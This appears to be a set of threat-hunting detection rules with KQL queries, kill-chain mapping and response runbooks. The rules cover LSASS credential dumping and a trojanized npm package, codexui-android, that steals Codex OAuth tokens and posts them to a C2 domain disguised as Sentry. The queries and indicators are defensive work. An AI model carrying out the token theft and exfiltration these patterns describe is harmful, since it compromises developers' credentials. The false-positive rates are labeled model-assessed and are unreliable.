Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] npm/pnpm install of trojanized codexui-android package on developer endpoint · [LLM] Android device installed gptos.intelligence.assistant or codex.app (mobile delivery of Codex token stealer)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Legitimate-Looking Codex Remote UI Secretly Steals Your AI Tokens
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Non-Codex-CLI node process reading ~/.codex/auth.json (Codex OAuth credential theft) · [LLM] HTTPS POST to /startlog with codexui User-Agent (Codex exfil over the wire) · Crypto-wallet file/keystore access by non-wallet process · Infostealer — non-browser process accessing browser cookie/login DBs · OAuth consent / suspicious app grant
DNS/HTTPS exfil to sentry.anyclaw.store (Codex token C2 masquerading as Sentry) AICommand & Control High
Hunts DNS resolution or outbound HTTPS to the attacker C2 anyclaw.store / sentry.anyclaw.store used by the trojanized codexui-android npm package and its companion Play Store apps to POST stolen Codex auth.json blobs to /startlog. Endpoint is deliberately named to blend with legitimate Sentry telemetry. Rationale: Domain sentry.anyclaw.store + path /startlog + User-Agent codexui/<ver> are unique strings from the article's exfil function. No legitimate use of anyclaw.store exists. Cross-checked: domain pattern matches Aikido's IOC publication and anyclaw.store appears as the only C2 host across both npm package and Android APK chains in the article. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1071.001 T1036.005 T1567
Data sourcesNetwork_Traffic.All_Traffic Web.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • None expected - anyclaw.store is wholly attacker-controlled with no legitimate business use
  • Security researchers / IR teams sandboxing the malicious package
  • Threat-intel platforms enriching the domain via active resolution
  • Internal threat-hunting tooling deliberately probing the IOC
Response runbook
1. Triage: pull the DeviceName/Computer + InitiatingProcessFileName for every hit; if InitiatingProcessFileName == node.exe or a node child of pnpm, treat as confirmed exfil. Pull DeviceFileEvents for ~/.codex/auth.json reads on the same host in the 5 min preceding the connection. 2. Contain: block anyclaw.store and *.anyclaw.store at the proxy / DNS sinkhole; isolate the affected developer endpoint; revoke and rotate the user's Codex/OpenAI session - force re-login from openai.com to invalidate stolen refresh_token; remove codexui-android from npm cache and node_modules. 3. Hunt: pivot to find every host that installed codexui-android@>=0.1.82 (look for pnpm/npm install events referencing the package), every Android device with gptos.intelligence.assistant or codex.app installed, and any other resolutions to *.anyclaw.store across the org.
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has_any ("sentry.anyclaw.store","anyclaw.store") or RemoteUrl endswith ".anyclaw.store"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort, ActionType
| order by Timestamp desc
union isfuzzy=true
  (DnsEvents
    | where TimeGenerated > ago(30d)
    | where Name endswith "anyclaw.store"
    | project TimeGenerated, Computer, ClientIP, Name, QueryType, ResultCode),
  (ImDnsActivity
    | where TimeGenerated > ago(30d)
    | where DnsQuery endswith "anyclaw.store"
    | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, Name=DnsQuery, QueryType=DnsQueryTypeName, ResultCode=DnsResponseCodeName),
  (CommonSecurityLog
    | where TimeGenerated > ago(30d)
    | where DestinationHostName endswith "anyclaw.store" or RequestURL has "anyclaw.store/startlog" or RequestClientApplication startswith "codexui/"
    | project TimeGenerated, Computer=SourceHostName, ClientIP=SourceIP, Name=DestinationHostName, RequestURL, RequestClientApplication)
| order by TimeGenerated desc

npm/pnpm install of trojanized codexui-android package on developer endpoint AIDelivery High
Hunts the installation vector for the supply-chain attack - npm or pnpm pulling codexui-android (any version >= 0.1.82) onto a developer workstation or CI runner. The published npm artifact contains the malicious chunk-PUR7OUAG.js that the GitHub source does not. Rationale: `codexui-android` is the literal article-specific package name; chunk-PUR7OUAG.js is the unique malicious entry-point chunk only present in the npm artifact (never committed to GitHub). Either string in a node-tooling command line on a developer host is high-fidelity for this supply-chain attack. Cross-checked against: • https://www.aikido.dev/blog/codex-remote-ui-steals-ai-tokens
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes Endpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher / threat-hunter intentionally pulling the package in an isolated VM
  • CI pipeline that legitimately depended on the package before disclosure (pre-2026-04 historical hits)
  • Reproduction of an Aikido write-up by a fellow detection engineer
  • Internal mirror/proxy syncing the package metadata
Response runbook
1. Triage: confirm the user is a developer; confirm whether the install completed (look for a follow-on DeviceFileEvents write of node_modules/codexui-android/dist-cli/index.js or chunk-PUR7OUAG.js). Check if the user has ever signed into Codex from this host (DeviceFileEvents for ~/.codex/auth.json). 2. Contain: remove the package (npm uninstall -g codexui-android, delete node_modules entry); block anyclaw.store at egress; force the user to revoke and re-issue their Codex/OpenAI session, treating refresh_token as compromised. 3. Hunt: enumerate every host that installed the package and any DeviceNetworkEvents to *.anyclaw.store from that host in the install window; look for the matching Android Play Store apps (gptos.intelligence.assistant, codex.app) on MDM-managed mobile devices.
union isfuzzy=true
  (DeviceProcessEvents
    | where Timestamp > ago(60d)
    | where (InitiatingProcessFileName in~ ("npm.exe","pnpm.exe","yarn.exe","node.exe") or FileName in~ ("npm.exe","pnpm.exe","yarn.exe"))
    | where ProcessCommandLine has "codexui-android" or InitiatingProcessCommandLine has "codexui-android"
    | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath),
  (DeviceFileEvents
    | where Timestamp > ago(60d)
    | where FolderPath has "codexui-android" or FileName == "chunk-PUR7OUAG.js"
    | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, FileName, ProcessCommandLine=InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine=InitiatingProcessCommandLine, FolderPath)
| order by Timestamp desc
union isfuzzy=true
  (SecurityEvent
    | where TimeGenerated > ago(60d)
    | where EventID == 4688
    | where (NewProcessName endswith "\\npm.exe" or NewProcessName endswith "\\pnpm.exe" or NewProcessName endswith "\\yarn.exe" or NewProcessName endswith "\\node.exe" or ParentProcessName endswith "\\npm.exe" or ParentProcessName endswith "\\pnpm.exe")
    | where CommandLine has "codexui-android"
    | project TimeGenerated, Computer, Account=SubjectUserName, NewProcessName, CommandLine, ParentProcessName),
  (ImProcessCreate
    | where TimeGenerated > ago(60d)
    | where ActingProcessName has_any ("npm","pnpm","yarn","node") or ParentProcessName has_any ("npm","pnpm")
    | where ActingProcessCommandLine has "codexui-android" or ParentProcessCommandLine has "codexui-android"
    | project TimeGenerated, Computer=DvcHostname, Account=ActorUsername, NewProcessName=ActingProcessName, CommandLine=ActingProcessCommandLine, ParentProcessName)
| order by TimeGenerated desc
